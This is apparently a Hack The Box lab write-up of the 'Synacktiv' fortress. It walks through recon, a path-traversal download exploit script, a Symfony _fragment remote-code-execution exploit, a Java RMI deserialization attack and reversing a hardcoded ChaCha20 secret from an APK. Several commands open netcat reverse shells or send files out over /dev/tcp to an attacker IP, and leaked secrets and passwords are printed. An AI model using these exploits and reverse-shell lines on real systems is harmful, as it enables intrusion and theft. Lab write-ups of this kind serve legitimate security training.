# Nmap
```
# Nmap 7.95 scan initiated Fri Aug  1 13:26:06 2025 as: /usr/lib/nmap/nmap --privileged -sC -sV -Pn -oN ./nmap.txt 10.13.37.13
Nmap scan report for 10.13.37.13
Host is up (0.21s latency).
Not shown: 978 filtered tcp ports (no-response), 20 filtered tcp ports (port-unreach)
PORT   STATE  SERVICE VERSION
22/tcp closed ssh
80/tcp open   http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Hackfail.htb

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Aug  1 13:26:31 2025 -- 1 IP address (1 host up) scanned in 25.43 seconds
```

# Page check
**index page**
![](images/Pasted%20image%2020250801132848.png)

From the title of this index page, we can add the domain name `hackfail.htb` to `/etc/hosts`
**hackfail.htb**
![](images/Pasted%20image%2020250801133120.png)
Also I can find the name of `framework` is `Symfony`
![](images/Pasted%20image%2020250801140234.png)

Then we can see there are `login` and `register` pages:
![](images/Pasted%20image%2020250801133158.png)
![](images/Pasted%20image%2020250801133217.png)
Then we can create an account to access to dashboard
![](images/Pasted%20image%2020250801133301.png)
When I press the button of `Administrator`, it will give me the deny of access
![](images/Pasted%20image%2020250801133331.png)
From the `Internal News`, there are some blogs here
![](images/Pasted%20image%2020250801133421.png)

After checking these blogs, I did not find anything interesting.

I would continue to check the sub-domain of this site
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Synacktiv]
└─$ ffuf -u http://hackfail.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host:FUZZ.hackfail.htb" -fs 10676

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://hackfail.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.hackfail.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 10676
________________________________________________

dev                     [Status: 200, Size: 37579, Words: 18824, Lines: 660, Duration: 4706ms]

```

Then we can add `dev.hackfail.htb` to our `/etc/hosts`

**dev.hackfail.htb**
![](images/Pasted%20image%2020250801133811.png)
It looks same as the `hackfail.htb` page, but we can access` /_profiler` to enter the `symfony` debug mode
![](images/Pasted%20image%2020250801133936.png)

We can use `eos` to scan this host and dump information. In the Project sources section we can see the source code path.
```
eos scan http://dev.hackfail.htb
[+] Starting scan on http://dev.hackfail.htb

[+] Info
[!]   Symfony 5.2.3
[!]   PHP 7.2.34-11+0~20210213.57+debian9~1.gbp22d8a6
[!]   Environment: dev

[+] Request logs
[+] No POST requests

[+] Phpinfo
[+] Available at http://dev.hackfail.htb/_profiler/phpinfo
[+] Found 39 PHP variables
[!] Found the following Symfony variables:
[!]   APP_ENV: dev
[!]   APP_SECRET: e28eeb89adf51e1b57620f4ff1c3c5bb

[+] Project files
[+] Found: composer.lock, run 'symfony security:check' or submit it at https://security.symfony.com  
[!] Found the following files:
[!]   app/config/packages/assets.xml
[!]   app/config/packages/cache.php
[!]   app/config/packages/dev/debug.php
[!]   app/config/packages/cache.xml
[!]   app/config/packages/cache.yaml
[!]   app/config/packages/cache.yml
.......................................

[+] Routes
[!] Could not find any suitable 404 response

[+] Project sources
[!] Found the following source files:
[!]   src.php
[!]   src/Controller.php
[!]   src/Controller/AdminController.php
[!]   src/Controller/DefaultController.php
[!]   src/Controller/ErrorController.php
[!]   src/Controller/IndexController.php
[!]   src/Controller/UserController.php
[!]   src/Kernel.php
[!]   src/Tests.php

[+] Generated tokens: 
[+] Scan completed
```

Then we can read the source code here
Firstly,  `IndexController.php`
```
/**
     * @Route("/register", methods={"POST"})
     */
public function register(): Response
{
       include("antibf.php");
session_start();
       include("dbconfig.php");
       if(isset($_POST['username'])) {
           if($_POST['username']==='elonmusk') {
           if(isset($_SESSION["auth"]))
           {
                      return $this->render('register.html.twig', [  
'message' => "User already exists",
"error" => true,
"user" => $_SESSION["auth"],
                       ]);

           }
           else
           {
                  return $this->render('register.html.twig', [
'message' => "User already exists",
"error" => true,
                       ]);

           }
```

We can see how `/register` is configured, when a new user registers it checks to see if the user is `elonmusk` since it is an existing user in the database

Then we can try to create the account of `elonmusk`
![](images/Pasted%20image%2020250801134736.png)
It will give us this account existed, not wired.

Let's try to create account of `ElonMusk`
![](images/Pasted%20image%2020250801134820.png)
We can create it successfully, and also this account is `administrator` role
![](images/Pasted%20image%2020250801134909.png)

We can check the `changelog` 
![](images/Pasted%20image%2020250801134945.png)

And also we can create our default ticket here
![](images/Pasted%20image%2020250801135013.png)

# LFI vulnerable
Let's continue to check the source code of `AdminController.php`
```
eos get http://dev.hackfail.htb src/Controller/AdminController.php  
```
We can find `/download` function have `LFI`vulnerable
```
/** 
    * @Route("/download", methods={"GET"})
   */
public function download()
   {

       include("antibf.php");
session_start();
       include("dbconfig.php");
       if(isset($_SESSION["auth"]))
       {
$stmt=$conn->prepare('select username from users where username=?');
$stmt->bind_param("s",$_SESSION["auth"]);
$stmt->execute();
$result=$stmt->get_result();
$row=$result->fetch_assoc();
           if($row['username']==='elonmusk')
           {
$file_storage = "/var/www/blog_dev/uploads/";
               if(isset($_GET['c']) && !is_null($_GET['c'] && isset($_GET['file']) && !is_null($_GET['file'])))  
               {
$fullpath = $file_storage.$_GET['file'];
                   if(file_exists($fullpath))
                   {
                       if(md5($fullpath) === $_GET['c'])
                       {
                           echo file_get_contents($fullpath);
                       }}
```

The `/download `route checks to see if the user is `elonmusk`. If so, it allows us to download the file by passing two parameters: the route information in `file` and `c`

We need to calculate the `md5` value firstly, we can use python script to finish it 
```
#!/usr/bin/python3
import requests, hashlib, sys

if len(sys.argv) < 2:
    print(f"Usage: python3 {sys.argv[0]} <file>")
    sys.exit(1)

session = requests.Session()

target = "http://dev.hackfail.htb/login"
data = {"username": "ElonMusk", "password": "test123"}  
session.post(target, data=data)

default_path = "/var/www/blog_dev/uploads/"
file_path = f"../../../..{sys.argv[1]}"
full_path = default_path + file_path
hash = hashlib.md5(full_path.encode()).hexdigest()

target = "http://dev.hackfail.htb/download"
params = {"file": file_path, "c": hash}
request = session.get(target, params=params)

result = request.text.find("<!DOCTYPE html>")
print(request.text[:result].strip())

```

Then we can get the file `/etc/passwd`
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Synacktiv]
└─$ python3 LFI.py /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
mysql:x:104:110:MySQL Server,,,:/nonexistent:/bin/false
elonmusk:x:1000:1000:,,,:/home/elonmusk:/bin/bash

```

`elonmusk` would be our target, I hope I can get his `id_rsa`
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Synacktiv]
└─$ python3 LFI.py /home/elonmusk/.ssh/id_rsa

                                                                                                                                                                                
┌──(wither㉿localhost)-[~/Templates/htb-labs/Synacktiv]
└─$ python3 LFI.py /home/elonmusk/flag.txt   


```
Very sad, `www-data` seems don't have the access to `/home/elonmusk`

Let's check the `apache2` configuration files and Learn how this site works
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Synacktiv]
└─$ python3 LFI.py /etc/apache2/sites-enabled/000-default.conf 
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html

        ErrorLog /error.log
        CustomLog /access.log combined
</VirtualHost>
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        ServerName dev.hackfail.htb
        DocumentRoot /var/www/blog_dev/public

        <Directory "/var/www/blog_dev/public">
                AllowOverride All
        </Directory>
</VirtualHost>
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        ServerName hackfail.htb
        DocumentRoot /var/www/blog/public

        <Directory "/var/www/blog/public">
                AllowOverride All
        </Directory>
</VirtualHost>

```

Continue reading the `.env` file of the first web `/var/www/blog` that stores variables
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Synacktiv]
└─$ python3 LFI.py /var/www/blog/.env                         
# In all environments, the following files are loaded if they exist,
# the latter taking precedence over the former:
#
#  * .env                contains default values for the environment variables needed by the app
#  * .env.local          uncommitted file with local overrides
#  * .env.$APP_ENV       committed environment-specific defaults
#  * .env.$APP_ENV.local uncommitted environment-specific overrides
#
# Real environment variables win over .env files.
#
# DO NOT DEFINE PRODUCTION SECRETS IN THIS FILE NOR IN ANY OTHER COMMITTED FILES.
#
# Run "composer dump-env prod" to compile .env files for production use (requires symfony/flex >=1.2).
# https://symfony.com/doc/current/best_practices.html#use-environment-variables-for-infrastructure-configuration

###> symfony/framework-bundle ###
APP_ENV=prod
APP_SECRET=8c780d40a55d81caf1583f1de0bfede3
###< symfony/framework-bundle ###

```

# Remote code execution on Symfony
There is blog explaining how to `Remote code execution on Symfony based websites`
```
https://blog.lexfo.fr/symfony-secret-fragment.html
https://github.com/ambionics/symfony-exploits.git
```
Then we can run the exploited script here
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Synacktiv/symfony-exploits]
└─$ python3 secret_fragment_exploit.py http://hackfail.htb/_fragment -i http://hackfail.htb/_fragment -m 1 -s 8c780d40a55d81caf1583f1de0bfede3 -a sha256 -f shell_exec -p cmd:'netcat -e /bin/bash 10.10.14.5 443'    
http://hackfail.htb/_fragment?_path=cmd%3Dnetcat%2B-e%2B%252Fbin%252Fbash%2B10.10.14.5%2B443%26_controller%3Dshell_exec&_hash=CfHiHMP82nuhrlkgr7l362nJSoBGtqJ6kSYie0B354U%3D
                                                                                                                                                                                
┌──(wither㉿localhost)-[~/Templates/htb-labs/Synacktiv/symfony-exploits]
└─$ curl -s 'http://hackfail.htb/_fragment?_path=cmd%3Dnetcat%2B-e%2B%252Fbin%252Fbash%2B10.10.14.5%2B443%26_controller%3Dshell_exec&_hash=CfHiHMP82nuhrlkgr7l362nJSoBGtqJ6kSYie0B354U%3D'
```

We can get the reverse shell as `www-data`
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Synacktiv]
└─$ nc -lnvp 443                               
listening on [any] 443 ...
connect to [10.10.14.5] from (UNKNOWN) [10.13.37.13] 35494

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
whoami
www-data

```

Let's upgrade our shell here
```
python3 -c 'import pty;pty.spawn("bash")'
^Z
stty raw -echo; fg
```

We can get the first flag here
```
www-data@blog:/var/www/blog/public$ ls
antibf.php  css  dbconfig.php  fonts  img  index.php  js
www-data@blog:/var/www/blog/public$ cd ..
www-data@blog:/var/www/blog$ ls
bin            composer.lock  flag.txt  src           templates  var
composer.json  config         public    symfony.lock  uploads    vendor
www-data@blog:/var/www/blog$ cat flag.txt
SYNACKTIV{Br34K_Th3_@pp_1Nt0_Fr4gM3NtS}
```

By checking the `ip` address here, we can found we can are in the internal environment
```
www-data@blog:/var/www/blog$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
13: enp0s3@if14: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
    link/ether d2:14:ae:eb:98:dd brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.22.1.97/24 brd 172.22.1.255 scope global enp0s3
       valid_lft forever preferred_lft forever
    inet6 fe80::d014:aeff:feeb:98dd/64 scope link 
       valid_lft forever preferred_lft forever
```

Then by checking the process in the background, we can found `elonmusk` run `java`
```
www-data@blog:/var/www/blog$ ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.2 177184  9576 ?        Ss   03:16   0:00 /sbin/init
root        18  0.0  0.1  35616  8036 ?        Ss   03:16   0:00 /lib/systemd/sy
root        54  0.0  0.0   9304  2660 ?        Ss   03:16   0:00 /usr/sbin/cron 
root        60  0.0  0.0   4172  1956 pts/1    Ss+  03:16   0:00 /sbin/agetty -o
root        61  0.0  0.0   4172  1984 pts/1    Ss+  03:16   0:00 /sbin/agetty -o
root        63  0.0  0.0   4172  1960 pts/2    Ss+  03:16   0:00 /sbin/agetty -o
root        65  0.0  0.0   4172  2080 pts/0    Ss+  03:16   0:00 /sbin/agetty -o
root        66  0.0  0.0   4172  2064 pts/3    Ss+  03:16   0:00 /sbin/agetty -o
mysql      168  0.0  2.1 1718072 88560 ?       Ssl  03:16   0:02 /usr/sbin/mysql
root       200  0.0  0.0 225960  3692 ?        Ssl  03:16   0:00 /usr/sbin/rsysl
root       377  0.0  0.5 279504 21020 ?        Ss   03:16   0:00 /usr/sbin/apach
www-data   385  0.0  0.6 280256 24728 ?        S    03:16   0:01 /usr/sbin/apach
www-data   388  0.0  0.6 280292 24964 ?        S    03:16   0:01 /usr/sbin/apach
www-data   667  0.0  0.6 280244 25252 ?        S    03:37   0:01 /usr/sbin/apach
www-data   698  0.0  0.5 280236 20824 ?        S    03:37   0:01 /usr/sbin/apach
www-data   711  0.0  0.6 280264 25136 ?        S    03:37   0:01 /usr/sbin/apach
www-data   850  0.0  0.5 280244 20268 ?        S    03:39   0:01 /usr/sbin/apach
www-data   968  0.0  0.6 280264 25036 ?        S    03:46   0:00 /usr/sbin/apach
www-data   974  0.0  0.5 280264 23212 ?        S    03:46   0:00 /usr/sbin/apach
www-data   979  0.0  0.5 280244 22188 ?        S    03:46   0:00 /usr/sbin/apach
www-data   981  0.0  0.5 280236 22140 ?        S    03:46   0:00 /usr/sbin/apach
www-data  1333  0.0  0.0   2388   748 ?        S    04:10   0:00 sh -c netcat -e
www-data  1334  0.0  0.0   3736  2728 ?        S    04:10   0:00 bash
www-data  1381  0.0  0.2  14064  8212 ?        S    04:12   0:00 python3 -c impo
www-data  1382  0.0  0.0   4096  3456 pts/4    Ss   04:12   0:00 bash
elonmusk  1396  4.4  0.8 3572012 34340 ?       Ssl  04:14   0:00 /usr/lib/jvm/jd
www-data  1413  0.0  0.0   7868  2904 pts/4    R+   04:15   0:00 ps aux

```

I can upload the `pspy64` to help us find what is actually do
```
2025/08/01 04:19:29 CMD: UID=1000 PID=1498   | /usr/bin/ss -tlp 
2025/08/01 04:19:29 CMD: UID=1000 PID=1500   | /usr/bin/ss -tp 
2025/08/01 04:19:29 CMD: UID=1000 PID=1501   | /usr/lib/jvm/jdk-11.0.10/bin/java -jar /home/elonmusk/monitoringClient.jar 172.22.1.250
```

We can read it and we can download it to our local machine
```
www-data@blog:/var/www/blog$ ls -al /home/elonmusk/monitoringClient.jar
-r--r--r-- 1 elonmusk elonmusk 1269977 Feb 19  2021 /home/elonmusk/monitoringClient.jar
www-data@blog:/var/www/blog$ cp /home/elonmusk/monitoringClient.jar /tmp
www-data@blog:/var/www/blog$ cat /tmp/monitoringClient.jar >& /dev/tcp/10.10.14.5/4444 0>&1   
```

Let's use `jd-gui` to `decompile` it 
From the main Class
![](images/Pasted%20image%2020250801141911.png)
We see the Main class that takes the parameters and connects to port 1099 of that IP.
So I guess there should be more active hosts
Let's upload a static binary `nmap` to target machine 
`https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap`
```
www-data@blog:/tmp$ ./nmap -sn 172.22.1.0/24 -oG - 
# Nmap 6.49BETA1 scan initiated Fri Aug  1 04:29:18 2025 as: ./nmap -sn -oG - 172.22.1.0/24
Cannot find nmap-payloads. UDP payloads are disabled.
Host: 172.22.1.53 ()    Status: Up
Host: 172.22.1.97 ()    Status: Up
Host: 172.22.1.250 ()   Status: Up
# Nmap done at Fri Aug  1 04:29:38 2025 -- 256 IP addresses (3 hosts up) scanned in 20.13 seconds
```

Then continue to check there ports and services, we have known we are located in `172.22.1.97`
```
www-data@blog:/tmp$ ./nmap 172.22.1.53 

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2025-08-01 04:30 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 172.22.1.53
Host is up (0.000077s latency).
Not shown: 1206 closed ports
PORT   STATE SERVICE
21/tcp open  ftp

Nmap done: 1 IP address (1 host up) scanned in 13.04 seconds
www-data@blog:/tmp$ ./nmap 172.22.1.250  

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2025-08-01 04:30 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 172.22.1.250
Host is up (0.000078s latency).
Not shown: 1206 closed ports
PORT     STATE SERVICE
1099/tcp open  rmiregistry

Nmap done: 1 IP address (1 host up) scanned in 13.04 seconds

```

To connect, we will use `chisel` to tunnel over port 1080
```
www-data@blog:/tmp$ ./chisel client 10.10.14.5:9999 R:socks & 
[2] 1708
www-data@blog:/tmp$ 2025/08/01 04:35:26 client: Connecting to ws://10.10.14.5:9999
2025/08/01 04:35:29 client: Connected (Latency 305.857693ms)

┌──(wither㉿localhost)-[/opt/chisel]
└─$ chisel server --reverse --port 9999
2025/08/01 14:27:40 server: Reverse tunnelling enabled
2025/08/01 14:27:40 server: Fingerprint 73NUS791NothnUp3hrXSYWKbv0TYP4UXr1jfeko18e0=
2025/08/01 14:27:40 server: Listening on http://0.0.0.0:9999
2025/08/01 14:28:27 server: session#1: Client version (1.10.1) differs from server version (1.10.1-0kali1)
2025/08/01 14:28:27 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

We can use `rmg` to enumerate the `rmi`
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Synacktiv]
└─$ proxychains -q java -jar rmg-5.1.0-jar-with-dependencies.jar enum 172.22.1.250 1099
[+] RMI registry bound names:
[+]
[+]     - monitoring
[+]             --> com.synacktiv.IMonitoringService (unknown class)
[+]                 Endpoint: 172.22.1.250:1337  CSF: RMISocketFactory  ObjID: [ccfc52e:19863a135cb:-7fff, -1590371508209022984]
[+]
[+] RMI server codebase enumeration:
[+]
[+]     - rsrc:./ jar:rsrc:json-lib-2.4-jdk15.jar!/ jar:rsrc:ezmorph-1.0.6.jar!/ jar:rsrc:commons-logging-1.1.1.jar!/ jar:rsrc:commons-lang-2.5.jar!/ jar:rsrc:commons-collections-3.2.1.jar!/ jar:rsrc:commons-beanutils-1.8.0.jar!/
[+]             --> com.synacktiv.IMonitoringService
[+]
[+] RMI server String unmarshalling enumeration:
[+]
[+]     - Server complained that object cannot be casted to java.lang.String.
[+]       --> The type java.lang.String is unmarshalled via readString().
[+]       Configuration Status: Current Default
[+]
[+] RMI server useCodebaseOnly enumeration:
[+]
[+]     - RMI registry uses readString() for unmarshalling java.lang.String.
[+]       This prevents useCodebaseOnly enumeration from remote.
[+]
[+] RMI registry localhost bypass enumeration (CVE-2019-2684):
[+]
[+]     - Registry rejected unbind call cause it was not sent from localhost.
[+]       Vulnerability Status: Non Vulnerable
[+]
[+] RMI Security Manager enumeration:
[+]
[+]     - Caught Exception containing 'no security manager' during RMI call.
[+]       --> The server does not use a Security Manager.
[+]       Configuration Status: Current Default
[+]
[+] RMI server JEP290 enumeration:
[+]
[+]     - DGC rejected deserialization of java.util.HashMap (JEP290 is installed).
[+]       Vulnerability Status: Non Vulnerable
[+]
[+] RMI registry JEP290 bypass enumeration:
[+]
[+]     - RMI registry uses readString() for unmarshalling java.lang.String.
[+]       This prevents JEP 290 bypass enumeration from remote.
[+]
[+] RMI ActivationSystem enumeration:
[+]
[+]     - Caught NoSuchObjectException during activate call (activator not present).
[+]       Configuration Status: Current Default
```

Using the guess mode will try to use a dictionary to discover methods in the service
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Synacktiv]
└─$ proxychains -q java -jar rmg-5.1.0-jar-with-dependencies.jar guess 172.22.1.250 1099
[+] Reading method candidates from internal wordlist rmg.txt
[+]     752 methods were successfully parsed.
[+] Reading method candidates from internal wordlist rmiscout.txt
[+]     2550 methods were successfully parsed.
[+]
[+] Starting Method Guessing on 3281 method signature(s).
[+]
[+]     MethodGuesser is running:
[+]             --------------------------------
[+]             [ monitoring ] HIT! Method with signature String login(String dummy, String dummy2) exists!
[+]             [3281 / 3281] [#####################################] 100%
[+]     done.
[+]
[+] Listing successfully guessed methods:
[+]
[+]     - monitoring
[+]             --> String login(String dummy, String dummy2)

```

It will find a method named `login` under the monitoring `boundname`
Come back to check from `jd-gui`
There is function called `login`, it seems use other function called `sendData`
![](images/Pasted%20image%2020250801143844.png)

We can use the `boundname` monitoring and `sendData` signatures to execute command via `deserialization`, which uses `netcat` to send us bash
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Synacktiv]
└─$ proxychains -q java -jar rmg-5.1.0-jar-with-dependencies.jar serial 172.22.1.250 1099 --yso /opt/ysoserial-all.jar --bound-name monitoring --signature 'String sendData(String dummy,Object dummy2)' CommonsCollections6 'netcat 10.10.14.5 4444 -e /bin/bash'
[+] Creating ysoserial payload... done.
[+]
[+] Attempting deserialization attack on RMI endpoint...
[+]
[+]     Using non primitive argument type java.lang.Object on position 1
[+]     Specified method signature is String sendData(String dummy,Object dummy2)
[+]
[+]     Caught ClassNotFoundException during deserialization attack.
[+]     Server attempted to deserialize canary class cf652ba84eba425ba5cad979806e6b0e.
[+]     Deserialization attack probably worked :)

```

Then we can get the shell as `monitoring`
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Synacktiv]
└─$ nc -lnvp 4444                              
listening on [any] 4444 ...
connect to [10.10.14.5] from (UNKNOWN) [10.13.37.13] 37052
whoami
monitoring
id
uid=1000(monitoring) gid=1000(monitoring) groups=1000(monitoring)

```
Let's upgrade the shell
```
python3 -c 'import pty;pty.spawn("bash")'
^Z
stty raw -echo; fg
```

We can get another flag from the home directory of `monitoring`
```
monitoring@watcher:/$ cd ~
monitoring@watcher:~$ ls
flag.txt  logs.txt  monitoringServer.jar
monitoring@watcher:~$ cat flag.txt 
SYNACKTIV{TrY_t0_m0n1t0r_My_g@dG3T5}
```

# shell as monitoring
Remember we have known there is a `ftp` service from `172.22.1.53`
We can use `anonymous` username to get access
```
monitoring@watcher:~$ ftp 172.22.1.53
Connected to 172.22.1.53.
220 (vsFTPd 3.0.3)
Name (172.22.1.53:monitoring): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0           20480 Feb 19  2021 backup.tar
226 Directory send OK.
ftp> get backup.tar
local: backup.tar remote: backup.tar
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for backup.tar (20480 bytes).
226 Transfer complete.
20480 bytes received in 0.00 secs (11.7587 MB/s)

```

Let's download `backup.tar` to our local machine to check it.
```
monitoring@watcher:~$ cat backup.tar >& /dev/tcp/10.10.14.5/1337 0>&1

┌──(wither㉿localhost)-[~/Templates/htb-labs/Synacktiv]
└─$ nc -lnvp 1337 > backup.tar       
listening on [any] 1337 ...
connect to [10.10.14.5] from (UNKNOWN) [10.13.37.13] 56794

```
There is a `logs.txt` in there.We can find the `mysql` credit of `elonmusk`
```
root     18153  0.0  0.3   3992  3216 ?        Ss+  20:37   0:00 /bin/bash
elonmusk 18480  0.0  0.1 275381 3462  ?        Ss+  20:44   0:00 mysql -u elonmusk -p 28fL+PvkSl0P5+zhkvPLCw appli
elonmusk 18481 94.0  4.9 2746800 49764 ?       Ssl  20:44   0:00 /usr/bin/java -jar /home/elonmusk/monitoringClient.jar 192.168.1.3
```

Let's try it to enter the `ftp` service
```
monitoring@watcher:~$ ftp 172.22.1.53
Connected to 172.22.1.53.
220 (vsFTPd 3.0.3)
Name (172.22.1.53:monitoring): elonmusk
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 1001     1001         4096 Feb 24  2021 bob
drwxr-xr-x    2 1000     1000         4096 Mar 05  2021 elonmusk

ftp> cd bob
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 1001     1001          184 Feb 24  2021 readme.txt

ftp> cd elon
550 Failed to change directory.
ftp> cd elonmusk
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 1000     1000      2280632 Mar 05  2021 hackfail-authenticator.apk
-rw-r--r--    1 1000     1000         4141 Feb 24  2021 hackfail.ovpn
```

Firstly, `/bob/readme.txt`
```
monitoring@watcher:~$ cat readme.txt 
Hey bob,
I already told you to change your credentials for the network_admin, it is too obvious!.
Once you have done that, please backup the files I told you on our network appliance.
```

Then download `hackfail-authenticator.apk` and `hackfail.ovpn` to local to analysis

To analysis the `apk` file, we need to use `d2j-dex2jar`to make `apk` to `.jar`
```
d2j-dex2jar hackfail-authenticator.apk  
```
Then use `jd-gui` to `decompile` it
From the main function, there seems some hard coded password
![](images/Pasted%20image%2020250801150334.png)

For the detailed process of encryption, we can get from class `ChaCha20`
![](images/Pasted%20image%2020250801150622.png)

If we want to `decrypte` them, we need the encrypted string and the plain text string, both of which can be found in the `MainActivity` class, and we will represent them in hexadecimal format.
We can write a python script to `decrypted` the secret message
```
#!/usr/bin/python3
import ctypes

plain_text = list(bytearray.fromhex("4c6f72656d20697073756d20646f6c6f722073697420616d65742c20636f6e7365637465747565722061646970697363696e6720656c69742e2041656e65616e20636f6d6d6f646f206c6967756c612e"))  
crypt_text = list(bytearray.fromhex("6a5b13ae21bd06b2426eb4c5fbe6f0c432c3e24e904daf6e064063dcbb5d9dd953bd85e038a2eb2b9495e3dffd58e0cc275a1e6f0fd262bf5371bab8969256b789bc66c9c8f6303a21d6400925e056ff"))  

plain_text = [int.from_bytes(bytes(plain_text[i * 4 : i * 4 + 4]), "big") for i in range(16)]
crypt_text = [int.from_bytes(bytes(crypt_text[i * 4 : i * 4 + 4]), "big") for i in range(16)]

def inner(state):
    def quarterRound(a, b, c, d):
        def rotate(v, c):
            return ((v >> c) & 0xffffffff) | v << (32 - c) & 0xffffffff

        state[b] = rotate(state[b], 7) ^ state[c]
        state[c] = (state[c] - state[d]) & 0xffffffff
        state[d] = rotate(state[d], 8) ^ state[a]
        state[a] = (state[a] - state[b]) & 0xffffffff
        state[b] = rotate(state[b], 12) ^ state[c]
        state[c] = (state[c] - state[d]) & 0xffffffff
        state[d] = rotate(state[d], 16) ^ state[a]
        state[a] = (state[a] - state[b]) & 0xffffffff

    for i in range(10):
        quarterRound(3, 4, 9, 14)
        quarterRound(2, 7, 8, 13)
        quarterRound(1, 6, 11, 12)
        quarterRound(0, 5, 10, 15)
        quarterRound(3, 7, 11, 15)
        quarterRound(2, 6, 10, 14)
        quarterRound(1, 5, 9, 13)
        quarterRound(0, 4, 8, 12)

    return b"".join([i.to_bytes(4, byteorder="little") for i in state][0:12]).decode()

def xor(a, b):
    a1 = ctypes.c_ulong(a).value
    b1 = ctypes.c_ulong(b).value

    a = f"{a1:08x}"
    b = f"{b1:08x}"

    if len(a) == 16:
        a = a[8:]

    if len(b) == 16:
        b = b[8:]

    value = ""

    for i in range(3, -1, -1):
        t = (hex(int("0x" + a[i * 2 : i * 2 + 2], 0) ^ int("0x" + b[i * 2 : i * 2 + 2], 0)))[2:]

        if len(t) == 1:
            t = "0" + t

        value += t

    return "0x" + value

password = inner([int(xor(plain_text[i], crypt_text[i]), 16) for i in range(16)])[16:]

print(password)
```

Run the script and we can get the secret
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Synacktiv]
└─$ python3 decrypted.py     
SYNACKTIV{m0r3_L1k3_Crypt0F@1l!}
```

# shell as network_admin
To understand how it works we will install the `apk` on our phone
![](images/Pasted%20image%2020250801153352.png)
We can input the key `SYNACKTIV{m0r3_L1k3_Crypt0F@1l!}`, then it will give us the OPT code
![](images/Pasted%20image%2020250801153428.png)

